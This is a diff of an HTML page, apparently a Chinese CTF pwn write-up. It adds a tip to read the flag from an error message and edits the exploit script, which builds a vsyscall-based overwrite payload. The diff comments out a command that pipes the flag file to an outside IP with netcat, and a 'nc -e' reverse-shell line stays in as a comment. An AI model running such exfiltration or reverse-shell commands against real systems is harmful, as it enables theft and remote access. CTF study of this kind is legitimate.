@@ -462,6 +462,8 @@ pwndbg&gt; x/5i 0xffffffffff600000
 
 <p>讲的很清楚</p>
 
+<p>但还有一个更简单的方法，使用 <code>sh flag;</code> 利用报错来拿到 flag</p>
+
 <h4 id="exp-1">exp</h4>
 
 <p>最终的 exp 如下, 其中的一些细节调试一遍会更加清楚</p>
@@ -509,8 +511,9 @@ io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34
 </span><span style="color:#e6db74">    .text:000000000004F43E                 jmp     short loc_4F45B
 </span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
     vsyscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffff600000</span>
-    cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cat flag| nc 123.207.141.87 9999 ;&#34;</span>
+    <span style="color:#75715e">#  cmd = &#34;cat flag| nc 123.207.141.87 9999 ;&#34;</span>
     <span style="color:#75715e">#  cmd = &#34;nc -e ip port;&#34;</span>
+    cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;sh flag;&#34;</span>
     payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x7f</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">+</span> cmd 
     payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0xE0</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">+</span> p64(vsyscall) <span style="color:#f92672">*</span> <span style="color:#ae81ff">20</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x3a</span><span style="color:#e6db74">&#39;</span>
 
